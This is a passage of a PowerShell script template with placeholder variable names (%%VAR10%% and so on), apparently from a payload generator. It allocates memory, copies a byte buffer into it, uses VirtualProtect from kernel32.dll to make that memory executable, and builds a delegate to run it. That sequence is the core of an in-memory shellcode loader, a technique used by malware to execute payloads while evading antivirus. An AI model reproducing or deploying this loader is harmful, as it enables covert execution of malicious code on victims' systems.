...
$%%VAR12%% = $%%VAR11%%.Invoke([IntPtr]::Zero, $%%VAR10%%.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($%%VAR10%%, 0, $%%VAR12%%, $%%VAR10%%.length)
$%%VAR36%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR2%% kernel32.dll VirtualProtect), (%%VAR6%% @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$%%VAR13%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%%VAR12%%, (%%VAR6%% @([IntPtr]) ([Void])))
$%%VAR36%%.Invoke($%%VAR12%%, [UInt32]0x1000, [UInt32]0x10, [Ref]0x00)
